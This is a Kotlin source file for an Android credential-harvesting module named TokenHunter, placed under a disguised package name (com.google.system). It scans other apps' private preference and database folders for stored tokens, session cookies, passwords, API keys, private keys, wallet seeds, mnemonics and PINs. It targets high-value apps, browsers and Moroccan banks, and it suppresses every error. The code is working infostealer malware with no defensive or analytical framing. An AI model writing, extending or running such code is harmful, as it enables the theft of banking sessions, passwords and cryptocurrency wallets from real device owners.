package com.google.system

import android.content.Context
import java.io.File

data class TokenFind(
    val app: String,
    val tokenType: String,
    val value: String,
    val source: String
)

object TokenHunter {

    private val TOKEN_KEYS = listOf(
        "token", "auth_token", "access_token", "refresh_token",
        "session", "session_id", "session_cookie",
        "cookie", "cookies",
        "secret", "api_key", "apikey", "api_secret",
        "password", "passwd", "login", "username",
        "bearer", "authorization", "oauth",
        "jwt", "jwt_token", "id_token",
        "key", "private_key", "public_key",
        "wallet", "seed", "mnemonic", "phrase",
        "pin", "pin_hash"
    )

    fun hunt(ctx: Context): List<TokenFind> {
        val results = mutableListOf<TokenFind>()
        val pm = ctx.packageManager

        fun scanPrefs(pkg: String, label: String) {
            try {
                val prefsDir = File("/data/data/$pkg/shared_prefs/")
                if (!prefsDir.exists()) return
                val xmlFiles = prefsDir.listFiles { f -> f.name.endsWith(".xml") } ?: return
                for (xml in xmlFiles) {
                    val content = try { xml.readText() } catch (_: Exception) { continue }
                    for (key in TOKEN_KEYS) {
                        val regex = Regex("""name="$key"\s*>(.*?)</""", RegexOption.IGNORE_CASE)
                        for (match in regex.findAll(content)) {
                            val value = match.groupValues[1].take(120)
                            if (value.isNotBlank() && value.length > 3) {
                                results.add(TokenFind(label, key, value, xml.name))
                            }
                        }
                    }
                }
            } catch (_: Exception) {}
        }

        fun scanDatabases(pkg: String, label: String) {
            try {
                val dbDir = File("/data/data/$pkg/databases/")
                if (!dbDir.exists()) return
                val dbs = dbDir.listFiles { f -> f.name.endsWith(".db") || f.name.endsWith(".sqlite") } ?: return
                for (db in dbs) {
                    if (db.length() > 500000) continue
                    results.add(TokenFind(label, "database", "${db.name} (${db.length() / 1024}KB)", db.name))
                }
            } catch (_: Exception) {}
        }

        val allTargets = mutableMapOf<String, String>()
        allTargets.putAll(HIGH_VALUE_APPS)
        allTargets.putAll(BROWSERS)
        try { allTargets.putAll(BANKS_MOROCCO) } catch (_: Exception) {}

        for ((pkg, label) in allTargets) {
            try {
                pm.getPackageInfo(pkg, 0)
                scanPrefs(pkg, label)
                scanDatabases(pkg, label)
            } catch (_: Exception) {}
        }

        return results.sortedBy { it.app }
    }
}
